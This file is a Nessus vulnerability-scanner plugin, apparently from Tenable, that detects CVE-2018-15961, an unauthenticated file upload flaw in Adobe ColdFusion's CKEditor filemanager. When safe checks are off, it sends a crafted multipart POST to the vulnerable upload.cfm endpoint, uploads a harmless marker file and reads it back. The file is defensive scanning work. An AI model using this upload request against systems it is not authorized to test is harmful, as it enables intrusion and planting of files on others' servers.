#TRUSTED abca47e6178dbe9cfb5ed76945e8e7842c9c2393fce635d0931c43fb72d9697945c4493611eeed3de33c8b7824ee825fa010f32156be632c639d45876ffb12318da3477f453e96af1ba8920b4462e12af86defe1f073519d214071f1b2abfc3aec8a9fec9fd8cbe5f5d9e59ed1a663c80aa39ca3e29bb3b24aac713fc4143da1b93f1e5ef5b7b193353cb49a478ffd14a247dad56f4581bb3ce253aa630ba97c74fa27254ea0a772d4d9a31aa29f131e67626b86cadeb2b7e3f005c0dbc60191b47b4614c94dfc24deb48161026b578a18e29f70bc5bbc1ff2f0ec9e6e29012901cc2686ebf92e94748304f52be3f34c098aa7cf11a847d8da80a25e5f73fc9d25072b36088deed98707118d196635d080d51a8f5baa1c71a51d9e61273cc5ea928312ec8b2f7f116a84f4a44adfa64b0dfa0e201fe696d915b1b6b23477a33fa7ca695a5b2249746725f1dc9243fefb0d641e932dfb5dd3619f3cc593dede465a140b301ee21a9160cc186a60c0a791d47b4ebae0df1e4d18fc5f1ea7000978f858c078eb0b7f9423c40a1e2208bce0bf675fb7c5d3de6b721dec77d32e9791d218217c58b99abdbfd0e9439e16ccabc9e95eae4e1fccac7e52b29fc1f4a608924951226a8a8f74408c981158eacea62a85f5c4390c8c1ede9dbde404c2704116e9794626aa8c8a066ada41aa291cf321cdc5d8a6d5a3dc9fa2d2a2dc59e220
#TRUST-RSA-SHA256 80a8090f8c46a8db6bb396660606523128f4e3879e8bf41c9a6041ea4174e47732034b6a53e478c269e74d55aaf5870c3885d54ba8271b707a193492c16fdb0f34bc6e3c7ed52f9972a67a3fe4b7872cb55e51e8646cb0adfaeece2804ef492cb21bc5e2e56d42648785d8f1512948dc2e403c6b79ed6ce2262fe07ad7c38c2ef52299e5247173f53f7628a8b9d4c8ea66fc3531eae76d3ac789f553868296afa134dd652fb0ecd095821d63ef1de196a64fa7164c66dcad47ec32af22e12fd925568a868165e0a67bfdca58f42132d76080acd63febac4fb922fe51ce62ec3295636f807d71d9322df3dc78b30abafcff0e78f7b2242e35bba98b072a84375d834ddd0cdd9ba097a56ac5cdd862451d53c6562d2ab05ef9d81a9e9ec2e5788e2f4994f7a21d6adc52ccb94d1dcd3738e64f6c057c085e83bdd97d04f02b8666889e51b6bc00654583aca5e842b7dc89290be0053b4057de9952348de2a3b9482afbedec1e5bc1036ea2c6a1415a42e65ce651aaa8b964131807ba49e8a1bd1f6fbc5678d199728c7c6e9d2ca65e8ab209b44d3c9c08714a9938a4cb5826f15b05ed75e117b4483d850e4048bd9ea4df92bd27fff307f5d54687c26bebce21880a251a92d956397544ccc08e4a09d7e1f3a1f764e24fae5c7d6b0db7d5ce24bed3acfba8a116a45e1864236a92e905bc95cc18368a685643785767137f8728b0
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(130263);
  script_version("1.12");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2018-15961");
  script_bugtraq_id(105314);
  script_xref(name:"EDB-ID", value:"45979");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/05/03");

  script_name(english:"Adobe ColdFusion File Upload (APSB18-33) (CVE-2018-15961)");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by an arbitrary file upload vulnerability.");
  script_set_attribute(attribute:"description", value:
"An arbitrary file upload vulnerability exists in Adobe ColdFusion due to insufficient validation in the filemanager
plugin. An unauthenticated, remote attacker can exploit this, via a specially crafted POST request, to upload arbitrary
files on the remote host.");
  script_set_attribute(attribute:"see_also", value:"https://helpx.adobe.com/security/products/coldfusion/apsb18-33.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Adobe ColdFusion 11 Update 15, 2016 Update 7, or 2018 Update 1 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2018-15961");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Adobe ColdFusion File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Adobe ColdFusion CKEditor unrestricted file upload');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2018/09/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/03/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/10/25");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:coldfusion");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("os_fingerprint.nasl", "coldfusion_detect.nasl");
  script_require_keys("installed_sw/ColdFusion");
  script_require_ports("Services/www", 80, 8500);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('install_func.inc');
include('misc_func.inc');
include('http.inc');
include('spad_log_func.inc');

##
# Sends a POST request with no data and determines, based on the status code, if target is vulnerable.
# 
# @return An array containing the vuln bool indicating whether the target was determined to be vulnerable
# and request, the last sent HTTP request
##
function send_empty_post()
{
  var vuln = false;
  var post_response = http_send_recv3(
    port            : port,
    method          : 'POST',
    item            : '/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm',
    data            : '',
    content_type    : 'application/json'
  );
  var request = http_last_sent_request();
  spad_log(message:'Attempted to determine vulnerability with:\n' + request);
  spad_log(message:'The response status code was:\n' + post_response[0]);

  if (!empty_or_null(post_response[0]) && '500 Internal Server Error' >< post_response[0])
    vuln = true;

  if (safe_checks() && !vuln)
    audit(AUDIT_LISTEN_NOT_VULN, app_name, port);

  return {'vuln' : vuln, 'request' : request};
}

##
# Attempts to upload a file to the target, and checks if it has succeeded
# returning the an array containing POST request if the upload is successful.
# 
# @return an array containing the POST request
##
function upload_file()
{
  # Generate a random pattern for the file contents to detect the file upload
  var pattern = rand_str(length:8, charset:'0123456789ABCDEF');
  var bound = 'nessus';
  var boundary = '--' + bound;
  var fname = SCRIPT_NAME + '-' + unixtime() + '.txt';

  var postdata =
    boundary + '\r\n' +
    'Content-Disposition: form-data; name="file"; filename="' + fname + '"\r\n' +
    'Content-Type: application/octet-stream\r\n\r\n' +
    pattern +
    '\n\r\n' +

    boundary + '\r\n' +
    'Content-Disposition: form-data; name="path"\r\n\r\n\n' +
    pattern +
    '\r\n' +
    boundary + '--' + '\r\n';

  http_send_recv3(method: "POST", port: port,
    item: '/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm',
    content_type: 'multipart/form-data; boundary=' + bound,
    data: postdata,
    add_headers:make_array('User-Agent', 'curl/7.47.0', 'Accept', '*/*', 'Expect', '100-continue'));

  var post_request = http_last_sent_request();
  spad_log(message:'Attempted to upload file with:\n' + post_request);

  var get_response = http_send_recv3(
    port            : port,
    method          : 'GET',
    item            : '/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/' + fname
  );

  if (empty_or_null(get_response[2]) || pattern >!< get_response[2])
    audit(AUDIT_LISTEN_NOT_VULN, app_name, port);

  var get_request = http_last_sent_request();
  spad_log(message:'Retrieved a matching file with:\n' + get_request);
  spad_log(message:'The contents of the retrieved file were:\n' + get_response[2]);

  return {'request': post_request};
}

#
# Main
#

app_name = 'ColdFusion';
get_install_count(app_name:app_name, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app_name,
  port     : port
);

result = {'vuln': false, 'request': ''};
# If not paranoid and safe_checks_enabled, audit as potentially vulnerable
if (report_paranoia < 2 && safe_checks())
  audit(AUDIT_POTENTIAL_VULN, app_name);
# If paranoid, try to determine vulnerability based on status codes
if (report_paranoia >= 2)
  result = send_empty_post();
# If safe_checks are disabled and first test was not vulnerable, try to upload a file
if (!result['vuln'] && !safe_checks())
  result = upload_file();


security_report_v4(
  port: port,
  severity: SECURITY_HOLE,
  generic: TRUE,
  request: make_list(result['request'])
);
